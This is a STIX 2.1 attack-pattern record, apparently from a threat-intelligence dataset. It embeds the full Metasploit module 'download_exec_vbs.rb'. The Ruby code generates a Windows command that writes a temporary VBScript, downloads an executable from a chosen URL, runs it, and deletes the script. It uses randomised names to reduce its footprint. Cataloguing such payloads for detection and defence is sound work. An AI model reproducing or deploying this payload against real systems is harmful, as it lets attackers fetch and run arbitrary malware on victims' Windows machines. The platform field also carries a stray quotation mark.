{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ad10aebb-32dc-4cea-b810-ceb4068be3cf",
    "created": "2024-08-14T16:33:19.304043Z",
    "modified": "2024-08-14T16:33:19.304046Z",
    "name": "Windows Executable Download and Execute (via .vbs)",
    "description": "Download an EXE from an HTTP(S) URL and execute it",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/cmd/windows/download_exec_vbs.rb",
            "external_id": "download_exec_vbs.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = :dynamic\n\n  include Msf::Payload::Single\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'        => 'Windows Executable Download and Execute (via .vbs)',\n      'Description' => 'Download an EXE from an HTTP(S) URL and execute it',\n      'Author'      => 'scriptjunkie',\n      'License'     => BSD_LICENSE,\n      'Platform'    => 'win',\n      'Arch'        => ARCH_CMD,\n      'Handler'     => Msf::Handler::None,\n      'Session'     => Msf::Sessions::CommandShell,\n      'PayloadType' => 'cmd',\n      'RequiredCmd' => 'wscript',\n      'Payload'     =>\n        {\n          'Offsets' => { },\n          'Payload' => ''\n        }\n      ))\n\n    register_options(\n      [\n        OptString.new('URL', [ true, \"The pre-encoded URL to the executable\" ]),\n        OptString.new('EXT', [ true, \"The extension to give the saved file\", \"exe\" ]),\n        OptBool.new('INCLUDECMD', [ true, \"Include the cmd /q /c\", false ]),\n        OptBool.new('DELETE', [ true, \"Delete created .vbs after download\", true ])\n      ])\n  end\n\n  def generate(_opts = {})\n    return super + command_string\n  end\n\n  def command_string\n    # It's already long. Keep variable names short.\n    vbsname = Rex::Text.rand_text_alpha(1+rand(2))\n    exename = Rex::Text.rand_text_alpha(1+rand(2))\n    xmlhttpvar = Rex::Text.rand_text_alpha(1+rand(2))\n    streamvar = Rex::Text.rand_text_alpha(1+rand(2))\n\n    command = ''\n    command << \"cmd.exe /q /c \" if datastore['INCLUDECMD']\n    # \"start #{vbsname}.vbs\" instead of just \"#{vbsname}.vbs\" so that the console window\n    # disappears quickly before the wscript libraries load and the file downloads\n    command << \"cd %tmp%&echo Set #{xmlhttpvar}=CreateObject(\\\"Microsoft.XMLHTTP\\\"):\"+\n      \"#{xmlhttpvar}.Open \\\"GET\\\",\\\"#{datastore['URL']}\\\",False:\"+\n      \"#{xmlhttpvar}.Send:\"+\n      \"Set #{streamvar}=CreateObject(\\\"ADODB.Stream\\\"):\"+\n      \"#{streamvar}.Type=1:\"+\n      \"#{streamvar}.Open:\"+\n      \"#{streamvar}.Write #{xmlhttpvar}.responseBody:\"+\n      \"#{streamvar}.SaveToFile \\\"#{exename}.#{datastore['EXT']}\\\",2:\"+\n      \"CreateObject(\\\"WScript.Shell\\\").Run \\\"#{exename}.#{datastore['EXT']}\\\":\"\n    command << \"CreateObject(\\\"Scripting.FileSystemObject\\\").DeleteFile \\\"#{vbsname}.vbs\\\"\" if datastore['DELETE']\n    command << \" >#{vbsname}.vbs\"+\n      \"&start wscript #{vbsname}.vbs\"\n  end\nend\n",
    "x_mitre_platforms": [
        "win'"
    ]
}